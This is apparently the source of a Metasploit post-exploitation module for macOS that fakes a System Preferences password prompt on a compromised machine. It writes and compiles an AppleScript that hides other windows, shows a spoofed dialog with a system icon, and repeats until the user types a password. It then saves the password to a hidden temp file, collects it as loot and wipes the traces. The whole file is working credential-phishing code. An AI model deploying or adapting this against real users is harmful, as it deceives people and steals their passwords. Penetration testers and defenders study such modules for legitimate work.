require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post
	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Prompt the MAC-OSX user for password credentials.',
				'Description'   => %q{ },
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Joff Thyer <jsthyer at gmail.com>',
				                     'joev <jvennix[at]rapid7.com>' ],
				'Version'       => '',
				'Platform'      => [ 'osx' ],
				'SessionTypes'  => [ "shell" ]
			))

		register_options( [
			OptString.new(
				'TEXTCREDS', 
				[
					true, 
					'Text displayed when asking for password',
					'Type your password to allow System Preferences to make changes'
				]
			),
			OptString.new(
				'ICONFILE', 
				[
					true, 
					'Icon filename relative to bundle',
					'UserUnknownIcon.icns'
				]
			),
			OptString.new(
				'BUNDLEPATH', 
				[
					true, 
					'Path to bundle containing icon',
					'/System/Library/CoreServices/CoreTypes.bundle'
				]
			),
			OptInt.new('TIMEOUT', [true, 'Timeout for user to enter credentials', 60])
		], self.class)
	end

	def cmd_exec(str)
		print_status "Running cmd '#{str}'..."
		super
	end

	# Run Method for when run command is issued
	def run
		if client.nil?
			print_error("Invalid session ID selected. Make sure the host isn't dead.")
			return
		end

		host = case session.type
		when /meterpreter/
			sysinfo["Computer"]
		when /shell/
			cmd_exec("/bin/hostname").chomp
		end

		print_status("Running module against #{host}")

		dir       = "/tmp/." + Rex::Text.rand_text_alpha((rand(8)+6))
		runme     = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
		creds_osa = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
		creds     = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))
		passfile  = dir + "/" + Rex::Text.rand_text_alpha((rand(8)+6))

		username = cmd_exec("/usr/bin/whoami")
		cmd_exec("umask 0077")
		cmd_exec("/bin/mkdir #{dir}")

		# write the script that will launch things
		write_file(runme,run_script())
		cmd_exec("/bin/chmod 700 #{runme}")

		# write the credentials script, compile and run
		write_file(creds_osa,creds_script(passfile))
		cmd_exec("/usr/bin/osacompile -o #{creds} #{creds_osa}")
		cmd_exec("#{runme} #{creds}")
		print_status("Waiting for user '#{username}' to enter credentials...")

		timeout = ::Time.now.to_f + datastore['TIMEOUT'].to_i
		while (::Time.now.to_f < timeout)
			fileexist = cmd_exec("ls #{passfile}")
			if fileexist !~ /No such file/
				print_status("Password entered! What a nice compliant user...")
				break
			end
			Kernel.select(nil, nil, nil, 0.5)
		end

		if fileexist !~ /No such file/
			password_data = cmd_exec("/bin/cat #{passfile}")
			print_status("password file contents: #{password_data}")
			passf = store_loot("password", "text/plain", 
				session, password_data, "passwd.pwd", "OSX Password")
			print_status("Password data stored as loot in: #{passf}")
		else
			print_status("Timeout period expired before credentials were entered!")
		end

		print_status("Cleaning up files in #{host}:#{dir}")
		cmd_exec("/usr/bin/srm -rf #{dir}")
	end


	def run_script(wait=false)
		ch = if wait == false then "&" else "" end
		%Q{
			#!/bin/bash
			osascript <<_EOF_ #{ch}
			set scriptfile to "$1"
			tell application "AppleScript Runner"
				do script scriptfile
			end tell
			_EOF_
		}
	end


	def creds_script(passfile)
		textcreds = datastore['TEXTCREDS']
		ascript = %Q{
			set filename to "#{passfile}"
			set myprompt to "#{textcreds}"
			set ans to "Cancel"
			repeat
				try
					tell application "Finder"
						activate
						tell application "System Events" to keystroke "h" using {command down, option down}
						set d_returns to display dialog myprompt default answer "" with hidden answer buttons {"Cancel", "OK"} default button "OK" with icon path to resource "#{datastore['ICONFILE']}" in bundle "#{datastore['BUNDLEPATH']}"
						set ans to button returned of d_returns
						set mypass to text returned of d_returns
						if ans is equal to "OK" and mypass is not equal to "" then exit repeat
					end tell
				end try
			end repeat
			try
				set now to do shell script "date '+%Y%m%d_%H%M%S'"
					set user to do shell script "whoami"
				set myfile to open for access filename with write permission
				set outstr to now & ":" & user & ":" & mypass & "
			"
				write outstr to myfile starting at eof
				close access myfile
			on error
				try
					close access myfile
				end try
			end try 
		}
	end

	# Checks if the target is OSX Server
	def check_server
		# Get the OS Name
		osx_ver = case session.type
		when /meterpreter/
			cmd_exec("/usr/bin/sw_vers", "-productName").chomp
		when /shell/
			session.shell_command_token("/usr/bin/sw_vers -productName").chomp
		end

		osx_ver =~ /Server/
	end

	# Enumerate the OS Version
	def get_ver
		# Get the OS Version
		case session.type
		when /meterpreter/
			cmd_exec("/usr/bin/sw_vers", "-productVersion").chomp
		when /shell/
			session.shell_command_token("/usr/bin/sw_vers -productVersion").chomp
		end
	end
end
